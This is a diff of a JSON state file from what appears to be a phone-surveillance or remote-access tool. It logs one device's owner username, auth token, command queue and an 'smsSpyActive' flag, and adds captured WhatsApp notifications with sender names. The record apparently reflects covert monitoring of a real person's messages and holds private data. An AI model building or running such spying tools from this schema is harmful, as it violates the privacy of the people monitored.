@@ -108,7 +108,7 @@
     "deviceName": "HP-RASKA321-52A8",
     "ownerUsername": "Amsal.sim",
     "token": "906fc9b5e5fd7ed9167409d9979fb58b",
-    "lastSeen": 1776003664185,
+    "lastSeen": 1776003671051,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-11T16:02:07.690Z",
@@ -124,6 +124,22 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "𝙑𝙞𝙧𝙩𝙪𝙖𝙡 𝙁𝙧𝙞𝙚𝙣𝙙𝙨",
+        "content": "‎9 pesan baru",
+        "time": "12/04 21:21",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776003671639
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "𝙑𝙞𝙧𝙩𝙪𝙖𝙡 𝙁𝙧𝙞𝙚𝙣𝙙𝙨",
+        "content": "‎8 pesan baru",
+        "time": "12/04 21:21",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776003667510
+      },
       {
         "appName": "WhatsApp",
         "sender": "‎𝙑𝙞𝙧𝙩𝙪𝙖𝙡 𝙁𝙧𝙞𝙚𝙣𝙙𝙨 (8 pesan): ~ zaa?",
@@ -4107,22 +4123,6 @@
         "time": "12/04 07:22",
         "pkg": "com.whatsapp",
         "receivedAt": 1775953332155
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎1 pesan baru",
-        "time": "12/04 07:21",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775953269618
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "𝐀𝐑𝐓𝐇𝐈𝐂𝐀𝐋 𝐌𝐀𝐇𝐀𝐓𝐈𝐑 𝐃𝐋𝐌 𝐊𝐍𝐃𝐀𝐋𝐈 𝐇𝐄𝐊𝐀𝐋",
-        "content": "‎4 pesan baru",
-        "time": "12/04 07:18",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775953091675
       }
     ],
     "galleryPhotos": [],
